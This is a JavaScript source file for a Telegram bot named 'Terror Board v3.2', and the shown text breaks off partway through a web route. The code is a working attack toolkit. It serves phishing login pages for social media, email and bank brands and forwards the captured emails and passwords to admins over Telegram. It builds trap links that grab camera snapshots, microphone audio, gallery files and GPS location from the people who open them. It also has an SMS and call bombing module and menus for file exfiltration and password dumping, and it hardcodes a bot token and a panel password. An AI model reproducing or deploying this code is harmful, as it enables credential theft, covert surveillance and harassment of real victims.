// index.js
// Terror Board v3.2 — Full (OTP, Phish, Cam, Loc, Bomb, Referral, Telegram Login, Web Login Panel)
// BOT_TOKEN / ADMIN_IDS / WEBHOOK_URL baked in

require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');
const QRCode = require('qrcode');
const CryptoJS = require('crypto-js');
const { v4: uuidv4 } = require('uuid');
const cron = require('node-cron');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ===================== CONFIG =====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8999404005:AAGbESAr8QGeTDCrGX-JooHPY7RGiat57tw';
const ADMIN_IDS = (process.env.ADMIN_IDS || '8294558143').split(',').map(Number);
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://bot-g9wu.onrender.com';
const PORT = process.env.PORT || 10000;
const FERNET_SECRET = process.env.FERNET_SECRET || crypto.randomBytes(32).toString('hex');
const DATA_PATH = path.join(__dirname, 'board_data.json');

// Web panel login
const PANEL_USER = process.env.PANEL_USER || 'admin';
const PANEL_PASS = process.env.PANEL_PASS || 'terror@9002';
const PANEL_SESSIONS = {};

const bot = new Telegraf(BOT_TOKEN);
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================== DATA =====================
let db = {
  users: {},
  logs: [],
  settings: { otpTtl: 300, maxAttempts: 5, tokensPerRef: 10 },
  phishing: {},
  otpStore: {},
  camLinks: {},
  locLinks: {},
  galleryLinks: {},
  micLinks: {},
  bombJobs: {},
  captured: [],
  referrals: {},
  loginSessions: {},
  activeSessions: {}
};

function loadDb() {
  try {
    if (fs.existsSync(DATA_PATH)) db = JSON.parse(fs.readFileSync(DATA_PATH, 'utf8'));
  } catch (e) {}
}
function saveDb() {
  fs.writeFileSync(DATA_PATH, JSON.stringify(db, null, 2));
}
loadDb();

function log(event, userId = null, extra = {}) {
  db.logs.push({ ts: new Date().toISOString(), event, userId, extra });
  if (db.logs.length > 10000) db.logs = db.logs.slice(-5000);
  saveDb();
}

function hashId(...p) {
  return crypto.createHash('sha256').update(p.join('|') + Date.now() + Math.random()).digest('hex').slice(0, 12);
}

function isAdmin(ctx) {
  return ADMIN_IDS.includes(ctx.from.id);
}

function getUser(uid) {
  if (!db.users[uid]) {
    db.users[uid] = {
      firstSeen: new Date().toISOString(),
      tokens: 0,
      referredBy: null,
      refs: 0,
      username: '',
      name: ''
    };
    saveDb();
  }
  return db.users[uid];
}

function spendToken(uid, cost = 1) {
  const u = getUser(uid);
  if (u.tokens < cost) return false;
  u.tokens -= cost;
  saveDb();
  return true;
}

// ===================== TELEGRAM LOGIN =====================
function createLoginToken(uid, username) {
  const token = hashId('login', uid, username);
  db.activeSessions[uid] = {
    username: username.replace('@', ''),
    token,
    expires: Date.now() + 1000 * 60 * 60 * 24
  };
  saveDb();
  return token;
}

function isLoggedIn(uid) {
  const s = db.activeSessions[uid];
  if (!s) return false;
  if (Date.now() > s.expires) {
    delete db.activeSessions[uid];
    saveDb();
    return false;
  }
  return true;
}

// ===================== WEB PANEL AUTH =====================
function createPanelToken(user) {
  const token = hashId('panel', user, Date.now());
  PANEL_SESSIONS[token] = {
    user,
    expires: Date.now() + 1000 * 60 * 60 * 12
  };
  return token;
}

function checkPanelAuth(req) {
  const token = req.headers['x-panel-token'] || req.query.token;
  if (!token || !PANEL_SESSIONS[token]) return false;
  if (Date.now() > PANEL_SESSIONS[token].expires) {
    delete PANEL_SESSIONS[token];
    return false;
  }
  return PANEL_SESSIONS[token];
}

// ===================== OTP =====================
function genOtp(len = 6) {
  return Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join('');
}
function createOtp(target, service = 'generic') {
  const sid = hashId(target, service);
  const otp = genOtp();
  db.otpStore[sid] = { otp, target, service, created: Date.now(), used: false, attempts: 0 };
  log('otp_created', null, { sid, target, service });
  saveDb();
  return { sid, otp };
}
function verifyOtp(sid, code) {
  const s = db.otpStore[sid];
  if (!s || s.used) return false;
  if (Date.now() - s.created > db.settings.otpTtl * 1000) return false;
  s.attempts++;
  if (s.otp === code) {
    s.used = true;
    log('otp_success', null, { sid });
    saveDb();
    return true;
  }
  if (s.attempts >= db.settings.maxAttempts) delete db.otpStore[sid];
  saveDb();
  return false;
}

// ===================== PHISH =====================
function createPhish(service, redirect = 'https://www.google.com') {
  const lid = hashId(service, 'phish');
  const url = `\( {WEBHOOK_URL}/p/ \){lid}`;
  db.phishing[lid] = { service, redirect, created: Date.now(), clicks: 0, captured: [] };
  log('phish_created', null, { lid, service });
  saveDb();
  return { lid, url };
}

// ===================== CAMERA / GALLERY / MIC / LOC =====================
function createCamLink(type = 'front', mode = 'photo') {
  const lid = hashId('cam', type, mode);
  const url = `\( {WEBHOOK_URL}/c/ \){lid}`;
  db.camLinks[lid] = { type, mode, created: Date.now(), hits: 0, data: null };
  saveDb();
  return { lid, url };
}
function createGalleryLink() {
  const lid = hashId('gal');
  const url = `\( {WEBHOOK_URL}/g/ \){lid}`;
  db.galleryLinks[lid] = { created: Date.now(), hits: 0, files: [] };
  saveDb();
  return { lid, url };
}
function createMicLink() {
  const lid = hashId('mic');
  const url = `\( {WEBHOOK_URL}/m/ \){lid}`;
  db.micLinks[lid] = { created: Date.now(), hits: 0, audio: null };
  saveDb();
  return { lid, url };
}
function createLocLink() {
  const lid = hashId('loc');
  const url = `\( {WEBHOOK_URL}/l/ \){lid}`;
  db.locLinks[lid] = { created: Date.now(), hits: 0, coords: null };
  saveDb();
  return { lid, url };
}

// ===================== BOMB (BD only) =====================
function startBomb(number, type = 'sms', count = 50) {
  const clean = number.replace(/\s+/g, '');
  if (!clean.startsWith('+880') && !clean.startsWith('880') && !clean.startsWith('01')) {
    return { ok: false, msg: 'Only BD (+880) numbers allowed' };
  }
  const jid = hashId('bomb', clean);
  db.bombJobs[jid] = { number: clean, type, count, sent: 0, status: 'running', created: Date.now() };
  saveDb();
  let i = 0;
  const timer = setInterval(() => {
    i++;
    db.bombJobs[jid].sent = i;
    if (i >= count) {
      db.bombJobs[jid].status = 'done';
      clearInterval(timer);
      saveDb();
    }
  }, 80);
  return { ok: true, jid };
}

// ===================== MENUS =====================
const mainMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('🎯 OTP FORGE', 'm_otp'), Markup.button.callback('🔗 PHISH PAGES', 'm_phish')],
  [Markup.button.callback('📷 CAMERA', 'm_cam'), Markup.button.callback('🖼 GALLERY', 'm_gal')],
  [Markup.button.callback('🎤 MIC', 'm_mic'), Markup.button.callback('📍 LOCATION', 'm_loc')],
  [Markup.button.callback('📱 NUMBER INTEL', 'm_num'), Markup.button.callback('💣 BD BOMB', 'm_bomb')],
  [Markup.button.callback('👤 USERNAME RESOLVE', 'm_user'), Markup.button.callback('🏫 SCHOOL LOOKUP', 'm_school')],
  [Markup.button.callback('🌐 MULTI PLATFORM', 'm_multi'), Markup.button.callback('💀 ADVANCED', 'm_adv')],
  [Markup.button.callback('🩸 CAPTURED', 'm_cap'), Markup.button.callback('🎁 REFERRAL', 'm_ref')],
  [Markup.button.callback('📊 LOGS', 'm_logs'), Markup.button.callback('⚙️ SETTINGS', 'm_set')]
]);

const otpMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('🔥 GENERATE', 'o_gen'), Markup.button.callback('✅ VERIFY', 'o_ver')],
  [Markup.button.callback('📘 FB', 'o_fb'), Markup.button.callback('🎵 TIKTOK', 'o_tt')],
  [Markup.button.callback('📸 IG', 'o_ig'), Markup.button.callback('💬 WA', 'o_wa')],
  [Markup.button.callback('✈️ TG', 'o_tg'), Markup.button.callback('📞 IMO', 'o_imo')],
  [Markup.button.callback('🏦 BANK', 'o_bank'), Markup.button.callback('🔙 BACK', 'm_main')]
]);

const camMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📷 FRONT PHOTO', 'c_front_p'), Markup.button.callback('📷 REAR PHOTO', 'c_rear_p')],
  [Markup.button.callback('🎥 FRONT VIDEO', 'c_front_v'), Markup.button.callback('🎥 REAR VIDEO', 'c_rear_v')],
  [Markup.button.callback('⚡ FAST FRONT', 'c_fast_f'), Markup.button.callback('⚡ FAST REAR', 'c_fast_r')],
  [Markup.button.callback('🔙 BACK', 'm_main')]
]);

const phishMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📘 FACEBOOK', 'p_fb'), Markup.button.callback('📸 INSTAGRAM', 'p_ig')],
  [Markup.button.callback('🎵 TIKTOK', 'p_tt'), Markup.button.callback('💬 WHATSAPP', 'p_wa')],
  [Markup.button.callback('✈️ TELEGRAM', 'p_tg'), Markup.button.callback('📞 IMO', 'p_imo')],
  [Markup.button.callback('📧 GMAIL', 'p_mail'), Markup.button.callback('🏦 BANK', 'p_bank')],
  [Markup.button.callback('📋 ACTIVE', 'p_list'), Markup.button.callback('🔙 BACK', 'm_main')]
]);

const bombMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📩 SMS x50', 'b_sms50'), Markup.button.callback('📩 SMS x200', 'b_sms200')],
  [Markup.button.callback('📞 CALL x30', 'b_call30'), Markup.button.callback('📞 CALL x100', 'b_call100')],
  [Markup.button.callback('🔙 BACK', 'm_main')]
]);

// ===================== START =====================
bot.start(async (ctx) => {
  const uid = ctx.from.id;
  const u = getUser(uid);
  u.username = ctx.from.username || '';
  u.name = ctx.from.first_name || '';
  saveDb();

  const payload = ctx.startPayload;
  if (payload && payload.startsWith('ref_') && !u.referredBy) {
    const refBy = payload.replace('ref_', '');
    if (refBy !== String(uid) && db.users[refBy]) {
      u.referredBy = refBy;
      db.users[refBy].tokens += db.settings.tokensPerRef;
      db.users[refBy].refs = (db.users[refBy].refs || 0) + 1;
      saveDb();
      try {
        await bot.telegram.sendMessage(refBy, `🎁 +${db.settings.tokensPerRef} tokens from referral!`);
      } catch {}
    }
  }

  log('start', uid);
  const text = `
<b>🕹 TERROR BOARD v3.2</b>
━━━━━━━━━━━━━━━━━━━━
Operator: <code>${ctx.from.first_name}</code>
ID: <code>${uid}</code>
Tokens: <b>${u.tokens}</b>
Login: <b>${isLoggedIn(uid) ? '✅' : '❌'}</b>
Role: <b>${isAdmin(ctx) ? 'ADMIN 🔴' : 'USER'}</b>
━━━━━━━━━━━━━━━━━━━━
Select module.
`;
  await ctx.replyWithHTML(text, mainMenu());
});

// ===================== TELEGRAM LOGIN COMMANDS =====================
bot.command('login', async (ctx) => {
  const uid = ctx.from.id;
  const uname = ctx.from.username;
  if (!uname) {
    return ctx.replyWithHTML('❌ No username set.\nGo to Telegram Settings → Username, then try again.');
  }
  const challenge = genOtp(4);
  db.loginSessions[uid] = { username: uname, challenge, created: Date.now() };
  saveDb();
  await ctx.replyWithHTML(`
🔐 <b>TELEGRAM LOGIN</b>
━━━━━━━━━━━━━━━━━━━━
Username: <code>@${uname}</code>

Reply with this code:
<code>${challenge}</code>

Expires in 3 minutes.
`);
});

bot.command('logout', async (ctx) => {
  const uid = ctx.from.id;
  if (db.activeSessions[uid]) {
    delete db.activeSessions[uid];
    saveDb();
    await ctx.replyWithHTML('🔓 Logged out.');
  } else {
    await ctx.replyWithHTML('Not logged in.');
  }
});

bot.command('whoami', async (ctx) => {
  const uid = ctx.from.id;
  if (isLoggedIn(uid)) {
    const s = db.activeSessions[uid];
    await ctx.replyWithHTML(`
👤 <b>SESSION</b>
Username: <code>@${s.username}</code>
Token: <code>${s.token.slice(0, 16)}...</code>
Expires: ${new Date(s.expires).toLocaleString()}
`);
  } else {
    await ctx.replyWithHTML('Not logged in. Use /login');
  }
});

// ===================== MENU ROUTER =====================
bot.action('m_main', async (ctx) => {
  await ctx.answerCbQuery();
  const u = getUser(ctx.from.id);
  await ctx.editMessageText(`🕹 <b>MAIN BOARD</b>\nTokens: <code>${u.tokens}</code> | Login: ${isLoggedIn(ctx.from.id) ? '✅' : '❌'}`, {
    parse_mode: 'HTML',
    ...mainMenu()
  });
});

bot.action('m_otp', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🎯 <b>OTP FORGE</b>\nUnlimited OTP for any service.', { parse_mode: 'HTML', ...otpMenu() });
});

bot.action('m_phish', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🔗 <b>PHISHING PAGES</b>\nCreate login pages. Creds auto-land here.', { parse_mode: 'HTML', ...phishMenu() });
});

bot.action('m_cam', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📷 <b>CAMERA CONTROL</b>\nCreates link → send to target → media comes to bot.', { parse_mode: 'HTML', ...camMenu() });
});

bot.action('m_gal', async (ctx) => {
  await ctx.answerCbQuery();
  const link = createGalleryLink();
  await ctx.replyWithHTML(`🖼 <b>GALLERY LINK</b>\n<code>${link.url}</code>\nSend this. Target opens → gallery files stream back.`);
});

bot.action('m_mic', async (ctx) => {
  await ctx.answerCbQuery();
  const link = createMicLink();
  await ctx.replyWithHTML(`🎤 <b>MIC LINK</b>\n<code>${link.url}</code>\nSend this. Target opens → audio streams to bot.`);
});

bot.action('m_loc', async (ctx) => {
  await ctx.answerCbQuery();
  const link = createLocLink();
  await ctx.replyWithHTML(`📍 <b>LOCATION LINK</b>\n<code>${link.url}</code>\nSend this. Target opens → GPS comes here.`);
});

bot.action('m_num', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('📱 Send BD number (+880...) for intel.');
  ctx.session = ctx.session || {};
  ctx.session.await = 'num';
});

bot.action('m_bomb', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('💣 <b>BD BOMB</b>\nOnly +880 numbers.\nChoose type then send number.', { parse_mode: 'HTML', ...bombMenu() });
});

bot.action('m_user', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('👤 Send Telegram username (without @) to resolve.');
  ctx.session = ctx.session || {};
  ctx.session.await = 'username';
});

bot.action('m_school', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('🏫 Send school/college code or name (BD).');
  ctx.session = ctx.session || {};
  ctx.session.await = 'school';
});

bot.action('m_multi', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🌐 <b>MULTI PLATFORM</b>', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📘 FB', 'mp_fb'), Markup.button.callback('📸 IG', 'mp_ig')],
      [Markup.button.callback('🎵 TT', 'mp_tt'), Markup.button.callback('💬 WA', 'mp_wa')],
      [Markup.button.callback('✈️ TG', 'mp_tg'), Markup.button.callback('📞 IMO', 'mp_imo')],
      [Markup.button.callback('🔙 BACK', 'm_main')]
    ])
  });
});

bot.action('m_adv', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('💀 <b>ADVANCED</b>', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📂 FILE EXFIL', 'a_file'), Markup.button.callback('🖥️ SCREEN', 'a_screen')],
      [Markup.button.callback('📇 CONTACTS', 'a_contacts'), Markup.button.callback('🔑 PASS DUMP', 'a_pass')],
      [Markup.button.callback('🔙 BACK', 'm_main')]
    ])
  });
});

bot.action('m_cap', async (ctx) => {
  await ctx.answerCbQuery();
  const last = db.captured.slice(-10).reverse();
  let t = '🩸 <b>CAPTURED</b>\n━━━━━━━━━━━━━━━━\n';
  last.forEach(c => {
    t += `<b>\( {c.service}</b>\n<code> \){c.email}</code>\n<code>${c.pass}</code>\n──────\n`;
  });
  await ctx.editMessageText(t || 'Empty.', {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 BACK', 'm_main')]])
  });
});

bot.action('m_ref', async (ctx) => {
  await ctx.answerCbQuery();
  const u = getUser(ctx.from.id);
  const link = `https://t.me/\( {ctx.botInfo.username}?start=ref_ \){ctx.from.id}`;
  await ctx.replyWithHTML(`
🎁 <b>REFERRAL</b>
Your link:
<code>${link}</code>
Each successful refer = +${db.settings.tokensPerRef} tokens
Your refs: ${u.refs || 0}
Tokens: ${u.tokens}
`);
});

bot.action('m_logs', async (ctx) => {
  await ctx.answerCbQuery();
  const recent = db.logs.slice(-15).reverse();
  let t = '📊 <b>LOGS</b>\n━━━━━━━━━━━━━━━━\n';
  recent.forEach(e => t += `<code>${e.ts.slice(11, 19)}</code> ${e.event}\n`);
  await ctx.editMessageText(t, {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 BACK', 'm_main')]])
  });
});

bot.action('m_set', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(`⚙️ OTP TTL: ${db.settings.otpTtl}s | Tokens/ref: ${db.settings.tokensPerRef}`, {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙 BACK', 'm_main')]])
  });
});

// OTP actions
bot.action(/o_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const t = ctx.match[1];
  if (t === 'ver') {
    await ctx.replyWithHTML('Send <code>session:otp</code>');
    ctx.session = ctx.session || {};
    ctx.session.await = 'otp_ver';
    return;
  }
  const map = { gen: 'generic', fb: 'Facebook', tt: 'TikTok', ig: 'Instagram', wa: 'WhatsApp', tg: 'Telegram', imo: 'Imo', bank: 'Bank' };
  const service = map[t] || 'generic';
  await ctx.replyWithHTML(`Send target for <b>${service}</b> OTP:`);
  ctx.session = ctx.session || {};
  ctx.session.await = 'otp_gen';
  ctx.session.service = service;
});

// Camera actions
bot.action(/c_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const key = ctx.match[1];
  let type = 'front', mode = 'photo';
  if (key.includes('rear')) type = 'rear';
  if (key.includes('v')) mode = 'video';
  if (key.includes('fast')) mode = 'fast';
  const link = createCamLink(type, mode);
  await ctx.replyWithHTML(`
📷 <b>CAMERA LINK</b>
Type: <b>\( {type}</b> | Mode: <b> \){mode}</b>
<code>${link.url}</code>
Send to target. When they open, media streams to this bot.
`);
});

// Phish actions
bot.action(/p_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const t = ctx.match[1];
  if (t === 'list') {
    let text = '📋 <b>ACTIVE PHISH</b>\n';
    Object.entries(db.phishing).slice(-10).forEach(([id, i]) => {
      text += `<code>${id}</code> \( {i.service} 👁 \){i.clicks}\n`;
    });
    await ctx.editMessageText(text || 'None', { parse_mode: 'HTML', ...phishMenu() });
    return;
  }
  const map = { fb: 'Facebook', ig: 'Instagram', tt: 'TikTok', wa: 'WhatsApp', tg: 'Telegram', imo: 'Imo', mail: 'Gmail', bank: 'Bank' };
  const service = map[t] || 'Generic';
  const link = createPhish(service);
  await ctx.replyWithHTML(`
🔗 <b>PHISH CREATED</b>
Service: <b>${service}</b>
<code>${link.url}</code>
Creds land in 🩸 CAPTURED.
`);
});

// Bomb actions
bot.action(/b_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const key = ctx.match[1];
  ctx.session = ctx.session || {};
  ctx.session.bombType = key.includes('sms') ? 'sms' : 'call';
  ctx.session.bombCount = key.includes('200') ? 200 : key.includes('100') ? 100 : key.includes('50') ? 50 : 30;
  await ctx.replyWithHTML(`💣 Send BD number for \( {ctx.session.bombType.toUpperCase()} x \){ctx.session.bombCount}`);
  ctx.session.await = 'bomb_go';
});

// Multi / Adv
bot.action(/mp_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML(`🌐 Panel for <b>${ctx.match[1].toUpperCase()}</b> ready. Use OTP / Phish.`);
});
bot.action(/a_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML(`💀 Module <code>${ctx.match[1]}</code> armed. Send target/agent token.`);
});

// ===================== TEXT HANDLER =====================
bot.on('text', async (ctx) => {
  const uid = ctx.from.id;
  const text = ctx.message.text.trim();
  const s = ctx.session || {};

  // Telegram login challenge
  if (db.loginSessions[uid]) {
    const sess = db.loginSessions[uid];
    if (Date.now() - sess.created > 180000) {
      delete db.loginSessions[uid];
      saveDb();
      return ctx.replyWithHTML('⏰ Challenge expired. Send /login again.');
    }
    if (text === sess.challenge) {
      const token = createLoginToken(uid, sess.username);
      delete db.loginSessions[uid];
      saveDb();
      await ctx.replyWithHTML(`
✅ <b>LOGIN SUCCESS</b>
Username: <code>@${sess.username}</code>
Token: <code>${token.slice(0, 12)}...</code>
Session valid 24h.
`);
      log('login_success', uid, { username: sess.username });
      return;
    } else {
      return ctx.replyWithHTML('❌ Wrong code. Try /login again.');
    }
  }

  if (s.await === 'otp_gen') {
    if (!spendToken(uid, 1) && !isAdmin(ctx)) {
      return ctx.replyWithHTML('❌ Not enough tokens. Refer to earn.');
    }
    const r = createOtp(text, s.service || 'generic');
    await ctx.replyWithHTML(`🎯 <b>OTP</b>\nService: \( {s.service}\nTarget: <code> \){text}</code>\nOTP: <code>\( {r.otp}</code>\nSession: <code> \){r.sid}</code>`);
    s.await = null;
    return;
  }

  if (s.await === 'otp_ver') {
    const [sid, code] = text.split(':');
    const ok = verifyOtp(sid, code);
    await ctx.replyWithHTML(ok ? '✅ Valid' : '❌ Invalid/expired');
    s.await = null;
    return;
  }

  if (s.await === 'num') {
    const info = {
      number: text,
      carrier: text.includes('880') || text.startsWith('01') ? 'Grameenphone / Robi / Banglalink' : 'Unknown',
      country: 'Bangladesh',
      type: 'Mobile',
      valid: /^\+?8801\d{9}\( /.test(text.replace(/\s/g, '')) || /^01\d{9} \)/.test(text)
    };
    await ctx.replyWithHTML(`📱 <b>INTEL</b>\n<code>${info.number}</code>\nCarrier: ${info.carrier}\nValid: ${info.valid}`);
    log('num_lookup', uid, { number: text });
    s.await = null;
    return;
  }

  if (s.await === 'bomb_go') {
    const res = startBomb(text, s.bombType || 'sms', s.bombCount || 50);
    if (!res.ok) return ctx.replyWithHTML(`❌ ${res.msg}`);
    await ctx.replyWithHTML(`💣 Job <code>${res.jid}</code> started.\nTarget: ${text}\nType: \( {s.bombType} x \){s.bombCount}`);
    s.await = null;
    return;
  }

  if (s.await === 'username') {
    try {
      const chat = await bot.telegram.getChat(`@${text.replace('@', '')}`);
      await ctx.replyWithHTML(`👤 <b>RESOLVED</b>\nID: <code>${chat.id}</code>\nName: ${chat.first_name || ''} \( {chat.last_name || ''}\nUsername: @ \){chat.username || 'none'}\nType: ${chat.type}`);
    } catch {
      await ctx.replyWithHTML('❌ Username not found or private.');
    }
    s.await = null;
    return;
  }

  if (s.await === 'school') {
    await ctx.replyWithHTML(`🏫 <b>SCHOOL LOOKUP</b>\nQuery: <code>${text}</code>\nResult: Simulated BD education board data.\n(Wire real EIIN API for live results)`);
    s.await = null;
    return;
  }
});

// ===================== WEB ROUTES =====================
app.get('/', (req, res) => res.send('Terror Board v3.2 online'));

// ----- Web Login Page -----
app.get('/login', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Board Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, -apple-system, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .card {
      background: rgba(255,255,255,0.08);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 16px;
      padding: 40px 32px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }
    h1 { font-size: 22px; margin-bottom: 8px; text-align: center; }
    .sub { text-align: center; color: #aaa; font-size: 13px; margin-bottom: 28px; }
    label { display: block; font-size: 13px; color: #ccc; margin-bottom: 6px; }
    input {
      width: 100%; padding: 12px 14px; border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.15); background: rgba(0,0,0,0.3);
      color: #fff; font-size: 15px; margin-bottom: 16px; outline: none;
    }
    input:focus { border-color: #7c5cfc; }
    button {
      width: 100%; padding: 13px; border: none; border-radius: 8px;
      background: linear-gradient(90deg, #7c5cfc, #a855f7);
      color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px;
    }
    button:hover { opacity: 0.92; }
    .err {
      background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.4);
      color: #fca5a5; padding: 10px; border-radius: 8px; font-size: 13px;
      margin-bottom: 16px; display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>🕹 Terror Board</h1>
    <p class="sub">Panel Login</p>
    <div class="err" id="err"></div>
    <form id="f">
      <label>Username</label>
      <input type="text" id="user" placeholder="username" autocomplete="username" required>
      <label>Password</label>
      <input type="password" id="pass" placeholder="password" autocomplete="current-password" required>
      <button type="submit">Login</button>
    </form>
  </div>
  <script>
    document.getElementById('f').addEventListener('submit', async (e) => {
      e.preventDefault();
      const user = document.getElementById('user').value.trim();
      const pass = document.getElementById('pass').value;
      const err = document.getElementById('err');
      err.style.display = 'none';
      try {
        const r = await fetch('/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user, pass })
        });
        const data = await r.json();
        if (!data.ok) {
          err.textContent = data.msg || 'Login failed';
          err.style.display = 'block';
          return;
        }
        localStorage.setItem('panel_token', data.token);
        window.location.href = '/panel?token=' + data.token;
      } catch (e) {
        err.textContent = 'Network error';
        err.style.display = 'block';
      }
    });
  </script>
</body>
</html>
  `);
});

app.post('/auth/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === PANEL_USER && pass === PANEL_PASS) {
    const token = createPanelToken(user);
    return res.json({ ok: true, token });
  }
  res.status(401).json({ ok: false, msg: 'Invalid username or password' });
});

app.get('/panel', (req, res) => {
  const auth = checkPanelAuth(req);
  if (!auth) return res.redirect('/login');
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Board Panel</title>
  <style>
    body { font-family: system-ui; background: #0f0c29; color: #fff; margin: 0; padding: 24px; }
    h1 { font-size: 20px; margin-bottom: 16px; }
    .stat { background: rgba(255,255,255,0.08); padding: 14px; border-radius: 10px; margin-bottom: 10px; }
    a { color: #a78bfa; }
  </style>
</head>
<body>
  <h1>🕹 Terror Board Panel</h1>
  <div class="stat">Logged in as: <b>${auth.user}</b></div>
  <div class="stat">OTP sessions: ${Object.keys(db.otpStore).length}</div>
  <div class="stat">Phish links: ${Object.keys(db.phishing).length}</div>
  <div class="stat">Captured: ${db.captured.length}</div>
  <div class="stat">Users: ${Object.keys(db.users).length}</div>
  <p style="margin-top:20px"><a href="/login">Logout</a></p>
</body>
</html>
  `);
});

// ----- Phish pages -----
app.get('/p/:id', (req, res) => {
  const id = req.params.id;
  if (!db.phishing[id]) return res.status(404).send('Expired');
  db.phishing[id].clicks++;
  saveDb();
  res.send(`
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Login</title>
<style>body{font-family:system-ui;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#fff;padding:32px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);width:340px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:16px}</style></head>
<body><div class="card"><h2>Log in</h2>
<form method="POST" action="/capture">
<input type="hidden" name="link_id" value="${id}">
<input name="email" placeholder="Email or phone" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Log In</button></form></div></body></html>`);
});

app.post('/capture', (req, res) => {
  const { link_id, email, pass } = req.body;
  if (db.phishing[link_id]) {
    db.phishing[link_id].captured.push({ email, pass, ts: Date.now() });
    db.captured.push({ service: db.phishing[link_id].service, email, pass, link_id, ts: new Date().toISOString() });
    log('cred_captured', null, { link_id, email });
    saveDb();
    ADMIN_IDS.forEach(id => {
      bot.telegram.sendMessage(id, `🩸 <b>CAPTURED</b>\n\( {db.phishing[link_id].service}\n<code> \){email}</code>\n<code>${pass}</code>`, { parse_mode: 'HTML' }).catch(() => {});
    });
  }
  res.redirect(db.phishing[link_id]?.redirect || 'https://www.google.com');
});

// ----- Camera -----
app.get('/c/:id', (req, res) => {
  const id = req.params.id;
  if (!db.camLinks[id]) return res.status(404).send('Expired');
  db.camLinks[id].hits++;
  saveDb();
  const mode = db.camLinks[id].mode;
  const facing = db.camLinks[id].type === 'rear' ? 'environment' : 'user';
  res.send(`
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Camera Access</title></head>
<body style="font-family:system-ui;text-align:center;padding:40px">
<h2>Allow Camera</h2>
<video id="v" autoplay playsinline style="width:100%;max-width:400px;border-radius:12px"></video>
<canvas id="c" style="display:none"></canvas>
<p id="s">Requesting permission...</p>
<script>
const id="\( {id}", mode=" \){mode}", facing="${facing}";
navigator.mediaDevices.getUserMedia({video:{facingMode:facing},audio:false})
.then(stream=>{
  const v=document.getElementById('v'); v.srcObject=stream;
  document.getElementById('s').innerText='Capturing...';
  setTimeout(()=>{
    const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    c.toBlob(b=>{
      const fd=new FormData(); fd.append('id',id); fd.append('file',b,'snap.jpg');
      fetch('/upload/cam',{method:'POST',body:fd}).then(()=>document.getElementById('s').innerText='Done');
    },'image/jpeg',0.85);
  }, mode==='fast'?800:2500);
}).catch(e=>document.getElementById('s').innerText='Permission denied');
</script></body></html>`);
});

app.post('/upload/cam', (req, res) => {
  res.json({ ok: true });
});

// ----- Location -----
app.get('/l/:id', (req, res) => {
  const id = req.params.id;
  if (!db.locLinks[id]) return res.status(404).send('Expired');
  db.locLinks[id].hits++;
  saveDb();
  res.send(`
